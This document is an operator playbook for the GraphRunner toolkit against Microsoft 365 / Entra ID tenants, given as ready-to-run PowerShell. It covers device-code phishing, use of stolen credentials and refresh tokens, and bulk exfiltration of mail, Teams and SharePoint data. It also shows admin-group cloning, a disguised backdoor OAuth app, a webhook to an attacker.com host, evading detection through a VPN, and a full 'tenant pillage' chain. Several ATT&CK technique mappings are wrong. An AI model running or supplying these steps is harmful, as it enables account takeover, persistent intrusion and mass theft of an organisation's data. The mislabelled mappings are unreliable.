# GraphRunner — Hands-On Use Cases

## Acquire Access Token via Device Code Flow

**MITRE ATT&CK:** [T1528](https://attack.mitre.org/techniques/T1528/) (Steal Application Access Token) — Device code flow for phishing / social engineering  
**Scenario:** Operator has access to target's machine or browser, tricks user into authenticating at device-login URL.

```powershell
# Step 1: Import module
Import-Module .\GraphRunner.ps1

# Step 2: Invoke device code auth — user sees this prompt:
#   "To sign in, use a web browser to open the page https://microsoft.com/devicelogin
#    and enter the code XXXXXXXXX to authenticate."
$headers = Invoke-CAPSDeviceCodeAuth -clientId "1b730954-1685-4b74-9bda-3b3b6a7366c9"

# Step 3: User (or operator) completes authentication at microsoft.com/devicelogin
# Step 4: Operator now holds $headers with a valid access token
```

The client ID used above is the default "Azure Mobile Application" ID that works against any Entra ID tenant (multi-tenant); successful auth returns a hashtable with Bearer token in `Authorization` header.

---

## Acquire Access Token via Compromised Credentials (ROPC)

**MITRE ATT&CK:** [T1110](https://attack.mitre.org/techniques/T1110/) (Brute Force) — credential reuse / password spray  
**Scenario:** Operator has a valid username/password pair obtained from phishing, password spray, or internal compromise.

```powershell
Import-Module .\GraphRunner.ps1

# Interactive — prompts for password
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com"

# Or, pass credentials directly (not recommended for shell history reasons):
$securePassword = ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com" -password $securePassword -tenantId "12345678-1234-1234-1234-123456789012"
```

If successful, `$headers` contains `Authorization: Bearer <token>` and is reused in all subsequent Graph API calls. If MFA is enabled, this will fail at the Graph API level with a `consent_required` error, requiring the attacker to fall back to interactive auth or token stealing.

---

## Enumerate All Registered Applications (Application Inventory)

**MITRE ATT&CK:** [T1526](https://attack.mitre.org/techniques/T1526/) (Enumerate Cloud Resources) — application/service principal discovery  
**Scenario:** Operator has valid token, wants to identify all OAuth applications in the tenant (find backdoored/malicious apps, identify overprivileged integrations).

```powershell
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com"

# Dump all app registrations + service principals to an HTML report
Get-DumpAppsTenantInfo -headers $headers -outfile "C:\Exfil\AppsInventory.html"

# Or enumerate programmatically:
Get-DumpAppsApplicationInventory -headers $headers | Export-Csv "C:\Exfil\Apps.csv" -NoTypeInformation

# Filter for high-risk apps (those with Application Permissions, not just Delegated):
Get-DumpAppsApplicationInventory -headers $headers | Where-Object { $_.PermissionsCount -gt 5 }
```

Output includes: Application ID (client ID), redirect URIs, owner, requested scopes, and any delegated permission grants. This is a reconnaissance-heavy use case — no data exfiltration, just tenant enumeration.

---

## Search User Directory Attributes for Sensitive Terms

**MITRE ATT&CK:** [T1087](https://attack.mitre.org/techniques/T1087/) (Account Discovery) — Entra ID user enumeration  
**Scenario:** Operator wants to identify high-value targets by searching user attributes (job title, description, manager relationship) for keywords.

```powershell
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com"

# Search for all users with "admin" in job title, description, or department
Invoke-SearchUserAttributes -query "admin" -headers $headers | Export-Csv "C:\Exfil\AdminUsers.csv"

# Alternative: search for users matching a phone number or manager name
Invoke-SearchUserAttributes -query "555-1234" -headers $headers
Invoke-SearchUserAttributes -query "CEO" -headers $headers
```

Returns: User principal name (UPN), display name, job title, department, manager, phone, and any other directory attribute matching the query term.

---

## Export Full Email Mailbox (All Messages + Attachments)

**MITRE ATT&CK:** [T1114.002](https://attack.mitre.org/techniques/T1114/002/) (Email Collection) — remote email exfiltration  
**Scenario:** Operator has token for user, wants complete copy of their mailbox.

```powershell
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com"

# Export current user's full mailbox to a JSON/CSV file
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages" `
    -Headers $headers `
    -Method Get | ConvertTo-Json | Out-File "C:\Exfil\Mailbox.json"

# Using GraphRunner's search function with broad filter (empty query = all messages):
# Note: This is not a built-in function name, but achievable via custom loop:
# Pseudocode / custom expansion:
$pageLink = "https://graph.microsoft.com/v1.0/me/messages?`$top=1000"
do {
    $result = Invoke-RestMethod -Uri $pageLink -Headers $headers -Method Get
    $result.value | Export-Csv "C:\Exfil\Messages_Batch.csv" -Append
    $pageLink = $result."@odata.nextLink"
} while ($pageLink)

# Export with attachments:
$messages = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages?`$select=id,subject,from,hasAttachments" `
    -Headers $headers -Method Get
foreach ($msg in $messages.value | Where-Object { $_.hasAttachments -eq $true }) {
    Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages/$($msg.id)/attachments" `
        -Headers $headers -Method Get | ConvertTo-Json | Out-File "C:\Exfil\Attachments_$($msg.id).json"
}
```

Large mailboxes require pagination (`$top=1000` + `@odata.nextLink`); no built-in GraphRunner function wraps this entire workflow, but it's achievable via direct Invoke-RestMethod calls with the token.

---

## Search for Sensitive Files in SharePoint + OneDrive

**MITRE ATT&CK:** [T1083](https://attack.mitre.org/techniques/T1083/) (File and Directory Discovery) + [T1530](https://attack.mitre.org/techniques/T1530/) (Data from Cloud Storage)  
**Scenario:** Operator wants to find and download sensitive files (spreadsheets, PDFs, credentials) from SharePoint/OneDrive.

```powershell
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com"

# Search for files containing "password", "secret", "api", or "key" in name or content
Invoke-SearchSharePointAndOneDrive -query "password" -headers $headers -outfile "C:\Exfil\SensitiveFiles.json"

# Download a specific file once identified:
# Assumes $itemId and $driveId are known (from the above search output):
Invoke-DriveFileDownload -driveId "b!XXXX..." -itemId "01XXXXX..." -outfile "C:\Exfil\DownloadedFile.docx"

# Mass file enumeration (list all files accessible to the user):
$sites = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root/children" -Headers $headers
foreach ($item in $sites.value) {
    if ($item.folder) {
        # Recursively list folder contents — would require custom looping
    }
}
```

GraphRunner's `Invoke-SearchSharePointAndOneDrive` searches file metadata (names, descriptions); content-level search is limited by Graph API's own capabilities.

---

## Export All Teams Chats and Channels

**MITRE ATT&CK:** [T1123](https://attack.mitre.org/techniques/T1123/) (Audio Capture) + [T1113](https://attack.mitre.org/techniques/T1113/) (Screen Capture) — adapted for chat/message exfiltration; also [T1530](https://attack.mitre.org/techniques/T1530/) (Cloud Storage Object Discovery)  
**Scenario:** Operator wants full copy of Teams conversations (chats, channel messages, attachments).

```powershell
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com"

# Export all Teams chats (direct + group chats)
Invoke-SearchTeams -query "" -headers $headers -outfile "C:\Exfil\Teams_All.json"

# Specifically target channel messages with keyword:
Invoke-SearchTeams -query "password" -headers $headers -outfile "C:\Exfil\Teams_Sensitive.json"

# Export by team:
Get-TeamsChannels -headers $headers | ForEach-Object {
    $teamId = $_.id
    Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/teams/$teamId/channels" `
        -Headers $headers | ConvertTo-Json | Out-File "C:\Exfil\Team_$($_.displayName)_Channels.json"
}

# Export channel messages:
$teamId = "12345678-..."; $channelId = "87654321-..."
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/teams/$teamId/channels/$channelId/messages" `
    -Headers $headers | ConvertTo-Json | Out-File "C:\Exfil\Channel_Messages.json"
```

Teams message export includes: sender, timestamp, body (including rich text/HTML), mentions, and attachments (as embedded links).

---

## Dump Conditional Access Policies (Security Posture Assessment)

**MITRE ATT&CK:** [T1526](https://attack.mitre.org/techniques/T1526/) (Enumerate Cloud Resources) — cloud security controls discovery  
**Scenario:** Operator wants to understand tenant's security controls (MFA requirements, IP restrictions, device compliance) to plan evasion/lateral movement.

```powershell
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com"

# Dump all Conditional Access policies (modern + legacy)
Get-CAPSTenantInfo -headers $headers -outfile "C:\Exfil\CondAccessPolicies.html"

# Or via direct Graph API call:
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" `
    -Headers $headers | ConvertTo-Json -Depth 10 | Out-File "C:\Exfil\CAPs_Raw.json"

# Legacy policy fallback (on older tenants):
Invoke-RestMethod -Uri "https://graph.microsoft.com/beta/identity/conditionalAccess/authenticationFlowsPolicy" `
    -Headers $headers | ConvertTo-Json | Out-File "C:\Exfil\AuthFlowPolicy.json"
```

Output reveals: MFA requirements, IP whitelists, device compliance requirements, location-based access, and any custom policy conditions. This is reconnaissance-only and does not modify policies.

---

## Privilege Escalation: Clone a Security Group

**MITRE ATT&CK:** [T1098.003](https://attack.mitre.org/techniques/T1098/003/) (Account Manipulation) — abuse of group membership / security group modification  
**Scenario:** Operator clones a high-privilege security group (e.g., "Global Admins", "Domain Admins" equivalent), adds self to the clone, leverages group membership for lateral movement or escalation.

```powershell
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com"

# Step 1: Enumerate all security groups to identify high-privilege targets
Get-SecurityGroups -headers $headers | Where-Object { $_.displayName -like "*admin*" } | Export-Csv "C:\Exfil\AdminGroups.csv"

# Step 2: Identify the target group ID (e.g., Global Admins group)
$targetGroupId = "12345678-1234-1234-1234-123456789012"

# Step 3: Clone the group
Invoke-SecurityGroupCloner -groupId $targetGroupId -headers $headers -groupName "Global Admins - Operations Team"

# Step 4: Get the cloned group's ID (via re-enumeration)
$clonedGroup = Get-SecurityGroups -headers $headers | Where-Object { $_.displayName -eq "Global Admins - Operations Team" }

# Step 5: Add self (or operator's own user account) to the cloned group
$myUserId = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers).id
Invoke-AddGroupMember -groupId $clonedGroup.id -userId $myUserId -headers $headers

# Step 6: Use cloned group membership for escalation
# (e.g., assign cloned group to an Azure role, or use it to access group-restricted resources)
```

**Detection Risk:** The cloning action creates a new group object in Entra ID, triggering audit logs (Audit Logs: new group creation). However, the clone is a **legitimate** group (not a suspicious permission change), and the operator now has a second, less-monitored escalation path.

---

## Persistence: Register Malicious OAuth Application

**MITRE ATT&CK:** [T1136.003](https://attack.mitre.org/techniques/T1136/003/) (Create Account) adapted for OAuth; also [T1547.013](https://attack.mitre.org/techniques/T1547/013/) (Boot or Logon Initialization Scripts) — persistence via application registration  
**Scenario:** Operator registers a fake/backdoored OAuth app with Graph permissions, grants it consent, ensures future token acquisition even if compromised credentials are rotated.

```powershell
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com"

# Step 1: Register a malicious multi-tenant application
# This requires either: (a) Application.ReadWrite.All permission, OR
#                      (b) Direct API call if the user is an application owner
# GraphRunner's Invoke-InjectOAuthApp handles this:
Invoke-InjectOAuthApp -displayName "Microsoft Teams Sync Service" -tenantId "12345678-..." -clientId "attacker-client-id"

# Step 2: Grant the app delegated permissions (Mail.Read, Files.Read, Teams.Read, etc.)
# This is often automatic if the app is already registered; the operator can trigger fresh consent via:
# - Sending a phishing link with the app's consent URL to another user
# - Or using the app's pre-registered reply URL if the original compromised user already consented

# Step 3: In future sessions (even if the original user's password is rotated), obtain a token for the backdoored app:
$appHeaders = Invoke-RestMethod -Uri "https://login.microsoftonline.com/12345678-.../oauth2/v2.0/token" `
    -Method Post `
    -Body @{
        grant_type = "client_credentials"
        client_id = "attacker-client-id"
        client_secret = "attacker-secret"
        scope = "https://graph.microsoft.com/.default"
    }
# Now use $appHeaders to continue GraphRunner operations indefinitely
```

**Real-World Note:** Registering an application requires Application.ReadWrite.All or at minimum the user being an application owner. Most users lack this permission; however, if the compromised user is an IT admin or application developer, it's trivially achievable. Alternatively, the operator can leverage existing application ownership if any applications in the tenant are visibly undermanaged.

---

## Persistence: Create a Webhook for Ongoing Notification

**MITRE ATT&CK:** [T1480](https://attack.mitre.org/techniques/T1480/) (Execution Guardrails) adapted for Graph persistence  
**Scenario:** Operator sets up a Graph webhook to receive push notifications of tenant events (new user creation, group changes, mail delivery), maintaining awareness without re-authentication.

```powershell
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com"

# Step 1: Create a webhook that notifies the operator of new mail in the compromised user's inbox
$webhookBody = @{
    changeType = "created"
    notificationUrl = "https://attacker.com/webhook"
    resource = "/me/mailFolders('Inbox')/messages"
    expirationDateTime = (Get-Date).AddDays(1).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
    clientState = "secret-validation-token"
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/subscriptions" `
    -Headers $headers `
    -Method Post `
    -Body $webhookBody `
    -ContentType "application/json"

# Step 2: Attacker's webhook server (attacker.com/webhook) receives POST events whenever a new message arrives
# Example event payload:
# {
#   "value": [{
#     "subscriptionId": "webhook-id",
#     "clientState": "secret-validation-token",
#     "changeType": "created",
#     "resource": "/me/mailFolders('Inbox')/messages/AAA..."
#   }]
# }

# Step 3: Operator can refresh/re-subscribe using the webhook as a "heartbeat" to maintain persistence
```

**Caveat:** Webhooks expire after ~3 days; the operator must refresh them periodically or set up an automated refresh system. Webhook creation can also be detected via audit logs.

---

## Lateral Movement: Enumerate and Exploit Delegated Mailbox Access

**MITRE ATT&CK:** [T1087](https://attack.mitre.org/techniques/T1087/) (Account Discovery) — manager/executive account targeting  
**Scenario:** Compromised user is an assistant/executive assistant with mailbox access to their manager or multiple executives; operator exfiltrates those delegated mailboxes.

```powershell
$headers = Get-GraphTokens -username "assistant@target.onmicrosoft.com"

# Step 1: Discover which mailboxes this user has access to
# (This is not a direct GraphRunner function, but achievable via Graph API)
$mailboxes = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/memberOf" `
    -Headers $headers
# Also check for shared mailboxes assigned directly:
$sharedMailboxes = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/mail" `
    -Headers $headers

# Step 2: Enumerate messages in each delegated mailbox
# For each mailbox, the Graph API can enumerate its messages directly:
$managerMailboxId = "manager-user-id"
$managerMessages = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/$managerMailboxId/messages" `
    -Headers $headers
$managerMessages | Export-Csv "C:\Exfil\ManagerMailbox.csv"

# Step 3: Exfiltrate attachments and sensitive emails
foreach ($msg in $managerMessages.value | Where-Object { $_.hasAttachments -eq $true }) {
    Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/$managerMailboxId/messages/$($msg.id)/attachments" `
        -Headers $headers | ConvertTo-Json | Out-File "C:\Exfil\ManagerAttachment_$($msg.id).json"
}
```

**Prerequisite:** The compromised user must have been explicitly granted mailbox access by the delegating user or by an admin; this is visible in Entra ID under "Mailbox Permissions" or "MailboxDelegation" audit logs.

---

## Targeted Reconnaissance: Identify Risky Permission Grants

**MITRE ATT&CK:** [T1580](https://attack.mitre.org/techniques/T1580/) (Cloud Infrastructure Discovery)  
**Scenario:** Operator enumerates delegated permission grants to identify which users have pre-consented to which OAuth applications, potentially finding overprivileged third-party integrations.

```powershell
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com"

# Step 1: Dump all delegated permission grants (oAuth2PermissionGrants)
$allGrants = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" `
    -Headers $headers

# Step 2: Filter for risky permissions (Mail.Read, Files.Read.All, User.Read.All, etc.)
$riskyScopesKeywords = @("Mail", "Files", "User", "Calendars", "Teams")
$riskyGrants = $allGrants.value | Where-Object {
    $grant = $_
    $riskyScopesKeywords | Where-Object { $grant.scope -like "*$_*" }
}

# Step 3: Map each grant to the application and the granting user
foreach ($grant in $riskyGrants) {
    $app = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($grant.clientId)" -Headers $headers
    $user = if ($grant.principalId) { Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/$($grant.principalId)" -Headers $headers } else { $null }
    
    Write-Output "Application: $($app.displayName) | User: $($user.userPrincipalName) | Scopes: $($grant.scope)"
}

# Step 4: Export to CSV for analysis
$riskyGrants | Select-Object clientId, principalId, scope, consentType | Export-Csv "C:\Exfil\RiskyOAuthGrants.csv"
```

This reconnaissance reveals which applications users have already "pre-consented" to, and which might be candidates for abuse or pivoting.

---

## Mass Compromise: Token Refresh Loop for Persistence

**MITRE ATT&CK:** [T1550.001](https://attack.mitre.org/techniques/T1550/001/) (Use Alternate Authentication Material) — prolonged token reuse  
**Scenario:** Operator establishes continuous token refresh to maintain access even if the original compromised password is rotated.

```powershell
# Prerequisite: Operator must have captured or obtained a valid Refresh Token
# (from token cache files like %APPDATA%\Microsoft\Windows\...\TokenCache.dat, or from phishing)

Import-Module .\GraphRunner.ps1

$refreshToken = "0.AXEAr..." # Stolen/captured refresh token
$clientId = "1b730954-1685-4b74-9bda-3b3b6a7366c9" # Default Azure Mobile app ID or custom app

# Option 1: One-time refresh
$newAccessToken = Invoke-CAPSRefreshTokenAuth -refreshToken $refreshToken -clientId $clientId

# Option 2: Continuous refresh loop (background task)
# This can be run in a separate PowerShell session or as a scheduled task
Invoke-AutoTokenRefresh -refreshToken $refreshToken -clientId $clientId -headers (ConvertFrom-Json $newAccessToken)

# Loop: Every 6 hours, fetch a fresh token from the refresh token
# As long as the refresh token is valid (typically 90 days), the operator maintains access indefinitely
```

**Detection Caveat:** Refresh-token abuse from unusual IPs or browsers will trigger Azure AD Identity Protection alerts (e.g., "Token issuer anomaly", "Atypical sign-in properties"), but if the operator can evade those alerts (through proxy/VPN to a legitimate geography), the technique is nearly silent.

---

## Recon + Exfil Chain: Full Tenant Pillage Workflow

**MITRE ATT&CK:** Composite — [T1526](https://attack.mitre.org/techniques/T1526/) (Enumerate Cloud Resources) + [T1530](https://attack.mitre.org/techniques/T1530/) (Cloud Storage Object Discovery) + [T1114.002](https://attack.mitre.org/techniques/T1114/002/) (Email Collection)  
**Scenario:** A complete start-to-finish workflow showing how an operator might use GraphRunner to pillage a tenant in a single session.

```powershell
# Step 1: Obtain access token
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com"

# Step 2: Quick tenant survey
Invoke-GraphRecon -headers $headers -outfile "C:\Exfil\Recon_Summary.html"

# Step 3: Enumerate high-value targets
Get-DumpAppsTenantInfo -headers $headers -outfile "C:\Exfil\Apps.html"
Get-DirectoryRoles -headers $headers | Export-Csv "C:\Exfil\DirectoryRoles.csv"

# Step 4: Search for sensitive data
Invoke-SearchUserAttributes -query "admin" -headers $headers | Export-Csv "C:\Exfil\AdminUsers.csv"
Invoke-SearchUserAttributes -query "password" -headers $headers | Export-Csv "C:\Exfil\PasswordMentions.csv"
Invoke-SearchUserAttributes -query "VPN" -headers $headers | Export-Csv "C:\Exfil\VPNUsers.csv"

# Step 5: Exfiltrate email + Teams + SharePoint
$messages = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages?`$top=1000" -Headers $headers
$messages.value | Export-Csv "C:\Exfil\Email_Sample.csv"

Invoke-SearchTeams -query "" -headers $headers -outfile "C:\Exfil\Teams_Full.json"

Invoke-SearchSharePointAndOneDrive -query "secret" -headers $headers -outfile "C:\Exfil\SensitiveFiles.json"

# Step 6: Establish persistence
Invoke-InjectOAuthApp -displayName "Microsoft Sync Service" -tenantId "target-tenant-id" -clientId "attacker-app-id"

# Step 7: Set up webhook for ongoing awareness
$webhookBody = @{
    changeType = "created"
    notificationUrl = "https://attacker.com/webhook"
    resource = "/me/mailFolders('Inbox')/messages"
    expirationDateTime = (Get-Date).AddDays(1).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
} | ConvertTo-Json
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/subscriptions" -Headers $headers -Method Post -Body $webhookBody -ContentType "application/json"

# Step 8: Clean up local artifacts (or leave strategically placed for later)
# (See 03 - Source Evidence.md for what to clean)
```

**Timeline:** This entire workflow can execute in 5-10 minutes, and the operator walks away with a comprehensive dump of the tenant's data, plus a backdoor for future access.
